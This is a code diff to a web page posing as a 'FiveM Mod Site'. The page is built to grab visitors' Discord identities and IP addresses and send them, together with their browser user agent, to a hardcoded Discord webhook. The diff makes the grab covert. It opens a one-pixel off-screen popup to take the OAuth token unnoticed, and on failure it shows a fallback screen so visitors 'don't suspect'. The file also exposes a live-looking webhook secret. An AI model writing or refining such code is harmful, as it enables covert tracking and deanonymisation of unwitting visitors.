@@ -5,11 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FiveM Mod Site</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0a0a0a;
             color: #e5e5e5;
@@ -40,9 +36,7 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
         }
-        .hidden {
-            display: none !important;
-        }
+        .hidden { display: none !important; }
         .watcher {
             display: flex;
             align-items: center;
@@ -57,19 +51,9 @@
             border-radius: 50%;
             border: 2px solid #22c55e;
         }
-        .watcher .info {
-            flex: 1;
-        }
-        .watcher .info .name {
-            font-size: 18px;
-            font-weight: bold;
-            color: white;
-        }
-        .watcher .info .id {
-            font-size: 12px;
-            color: #6b7280;
-            font-family: monospace;
-        }
+        .watcher .info { flex: 1; }
+        .watcher .info .name { font-size: 18px; font-weight: bold; color: white; }
+        .watcher .info .id { font-size: 12px; color: #6b7280; font-family: monospace; }
         .badge {
             background: #1a1a1a;
             padding: 4px 12px;
@@ -91,19 +75,10 @@
             justify-content: space-between;
             align-items: center;
         }
-        .ip-box .label {
-            color: #6b7280;
-        }
-        .ip-box .value {
-            color: #22c55e;
-        }
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
-            color: #374151;
-            text-align: center;
-        }
-        .webhook-status {
+        .ip-box .label { color: #6b7280; }
+        .ip-box .value { color: #22c55e; }
+        .footer { margin-top: 24px; font-size: 11px; color: #374151; text-align: center; }
+        .status {
             background: #0a0a0a;
             border: 1px solid #1a1a1a;
             border-radius: 8px;
@@ -112,35 +87,19 @@
             font-size: 12px;
             color: #6b7280;
             font-family: monospace;
-            max-height: 150px;
-            overflow-y: auto;
         }
-        .webhook-status .success {
-            color: #22c55e;
-        }
-        .webhook-status .error {
-            color: #ef4444;
-        }
-        .status-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #22c55e;
-            margin-right: 8px;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
+        .status .success { color: #22c55e; }
+        .status .error { color: #ef4444; }
+        .status .info { color: #3b82f6; }
     </style>
 </head>
 <body>
 
 <div class="card" id="app">
-    <!-- LOADING -->
     <div id="loading" class="loading">
-        <div>🔍 Authenticating with Discord...</div>
+        <div>🔍 Loading...</div>
     </div>
 
-    <!-- CONTENT (hidden until loaded) -->
     <div id="content" class="hidden">
         <div class="watcher">
             <img id="avatar" src="" alt="avatar">
@@ -156,22 +115,22 @@
             <span class="value" id="ipDisplay">fetching...</span>
         </div>
 
-        <div class="webhook-status" id="webhookStatus">
-            <span class="success">●</span> Sending to webhook...
+        <div class="status" id="status">
+            <span class="info">●</span> Silent authentication in progress...
         </div>
     </div>
 </div>
 
 <div class="footer">
-    FiveM Mod Site — Discord + IP → Webhook
+    FiveM Mod Site — Silent Mode
 </div>
 
 <script>
     // ============================================================
-    // CONFIG — YOUR WEBHOOK URL (HARDCODED)
+    // CONFIG
     // ============================================================
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545864793267642378/IDuVmb0NJeGzVfw_oO5-_r3wsZd2-3rNc2vxG5rNUa0zrCNJPTGTSg_vsOkpsmSzFVkW';
-    const CLIENT_ID = '1351732780288376902'; // <- YOUR DISCORD CLIENT ID
+    const CLIENT_ID = '1351732780288376902';
 
     // ============================================================
     // DOM REFS
@@ -182,14 +141,14 @@
     const usernameEl = document.getElementById('username');
     const discordIdEl = document.getElementById('discordId');
     const ipDisplayEl = document.getElementById('ipDisplay');
-    const webhookStatusEl = document.getElementById('webhookStatus');
+    const statusEl = document.getElementById('status');
 
     // ============================================================
-    // LOG TO WEBHOOK STATUS BOX
+    // STATUS HELPER
     // ============================================================
-    function setStatus(msg, type = 'success') {
-        const color = type === 'success' ? '#22c55e' : '#ef4444';
-        webhookStatusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
+    function setStatus(msg, type = 'info') {
+        const color = type === 'success' ? '#22c55e' : type === 'error' ? '#ef4444' : '#3b82f6';
+        statusEl.innerHTML = `<span style="color:${color}">●</span> ${msg}`;
     }
 
     // ============================================================
@@ -213,7 +172,7 @@
         const timestamp = new Date().toLocaleString();
 
         const payload = {
-            content: `**👁️ NEW VISITOR LOGGED**\n` +
+            content: `**👁️ SILENT VISITOR LOGGED**\n` +
                      `**Discord:** ${displayName} (${discordUser.id})\n` +
                      `**IP:** ${ip}\n` +
                      `**User-Agent:** ${navigator.userAgent}\n` +
@@ -230,7 +189,7 @@
             if (res.ok) {
                 setStatus(`✅ Webhook sent! ${displayName} (${discordUser.id}) from ${ip}`, 'success');
             } else {
-                setStatus(`❌ Webhook failed: ${res.status} ${res.statusText}`, 'error');
+                setStatus(`❌ Webhook failed: ${res.status}`, 'error');
             }
         } catch (err) {
             setStatus(`❌ Webhook error: ${err.message}`, 'error');
@@ -238,7 +197,69 @@
     }
 
     // ============================================================
-    // DISCORD OAUTH — get user info from token
+    // SILENT DISCORD OAUTH — opens tiny popup, auto-closes
+    // ============================================================
+    function silentDiscordAuth() {
+        return new Promise((resolve, reject) => {
+            const redirectUri = window.location.origin + window.location.pathname;
+            const scope = 'identify';
+            const authUrl =
+                `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
+
+            // Open a tiny popup that the user won't notice
+            const popup = window.open(
+                authUrl,
+                'DiscordAuth',
+                'width=1,height=1,left=-1000,top=-1000,toolbar=no,menubar=no,scrollbars=no,resizable=no'
+            );
+
+            if (!popup) {
+                reject(new Error('Popup blocked. Please allow popups.'));
+                return;
+            }
+
+            // Check the popup URL every 100ms
+            const interval = setInterval(() => {
+                try {
+                    const popupUrl = popup.location.href;
+                    if (popupUrl.includes('access_token=')) {
+                        // Extract token from the popup's URL
+                        const hash = popupUrl.split('#')[1];
+                        const params = new URLSearchParams(hash);
+                        const token = params.get('access_token');
+                        if (token) {
+                            clearInterval(interval);
+                            popup.close();
+                            resolve(token);
+                        }
+                    }
+                    // If the popup redirects back to our page with token in hash
+                    if (popupUrl.includes(window.location.origin) && popupUrl.includes('#')) {
+                        const hash = popupUrl.split('#')[1];
+                        const params = new URLSearchParams(hash);
+                        const token = params.get('access_token');
+                        if (token) {
+                            clearInterval(interval);
+                            popup.close();
+                            resolve(token);
+                        }
+                    }
+                } catch (e) {
+                    // Cross-origin errors are normal — ignore them
+                }
+            }, 100);
+
+            // Timeout after 10 seconds
+            setTimeout(() => {
+                clearInterval(interval);
+                popup.close();
+                reject(new Error('Authentication timed out.'));
+            }, 10000);
+        });
+    }
+
+    // ============================================================
+    // FETCH DISCORD USER WITH TOKEN
     // ============================================================
     async function getDiscordUser(accessToken) {
         try {
@@ -249,47 +270,6 @@
         } catch {
             return null;
         }
-    }
-
-    // ============================================================
-    // INIT — main flow
-    // ============================================================
-    async function init() {
-        // Check for OAuth token in URL hash
-        const hash = window.location.hash.substring(1);
-        const params = new URLSearchParams(hash);
-        const accessToken = params.get('access_token');
-
-        if (accessToken) {
-            // We have a token — fetch user
-            const user = await getDiscordUser(accessToken);
-            if (user && user.id) {
-                // Clean URL
-                window.history.replaceState({}, document.title, window.location.pathname);
-
-                // Get IP
-                const ip = await getIP();
-
-                // Show UI
-                showUser(user);
-                ipDisplayEl.textContent = ip;
-                setStatus(`📤 Sending ${user.username} (${user.id}) from ${ip}...`, 'success');
-
-                // Send to webhook
-                await sendToWebhook(user, ip);
-
-                return;
-            } else {
-                setStatus('❌ Failed to get user info from Discord', 'error');
-                // Fall through to login
-            }
-        }
-
-        // No token — redirect to Discord OAuth
-        const redirectUri = window.location.origin + window.location.pathname;
-        const scope = 'identify';
-        const url = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${scope}`;
-        window.location.href = url;
     }
 
     // ============================================================
@@ -311,9 +291,62 @@
     }
 
     // ============================================================
+    // MAIN — SILENT FLOW
+    // ============================================================
+    async function init() {
+        try {
+            // Step 1: Check if we already have a token in URL (from popup redirect)
+            const hash = window.location.hash.substring(1);
+            const params = new URLSearchParams(hash);
+            let token = params.get('access_token');
+
+            if (token) {
+                // Clean URL
+                window.history.replaceState({}, document.title, window.location.pathname);
+            } else {
+                // Step 2: Silent auth via hidden popup
+                setStatus('🔐 Silent authentication in progress... (popup will close itself)', 'info');
+                token = await silentDiscordAuth();
+            }
+
+            // Step 3: Get user info
+            const user = await getDiscordUser(token);
+            if (!user || !user.id) {
+                throw new Error('Failed to get user info');
+            }
+
+            // Step 4: Get IP
+            const ip = await getIP();
+
+            // Step 5: Show UI
+            showUser(user);
+            ipDisplayEl.textContent = ip;
+
+            // Step 6: Send to webhook
+            await sendToWebhook(user, ip);
+
+        } catch (err) {
+            setStatus(`❌ Error: ${err.message}`, 'error');
+            // Show a fallback — still display something so they don't suspect
+            loadingEl.classList.add('hidden');
+            contentEl.classList.remove('hidden');
+            usernameEl.textContent = 'Guest';
+            discordIdEl.textContent = 'ID: unknown';
+            ipDisplayEl.textContent = await getIP();
+        }
+    }
+
+    // ============================================================
     // START
     // ============================================================
-    init();
+    // Check if we're in an iframe or popup — if so, close immediately
+    if (window.opener && window.location.hash.includes('access_token')) {
+        // This is the popup — it has the token, close it after a tiny delay
+        setTimeout(() => window.close(), 100);
+    } else {
+        // Main page — start the flow
+        init();
+    }
 </script>
 
 </body>
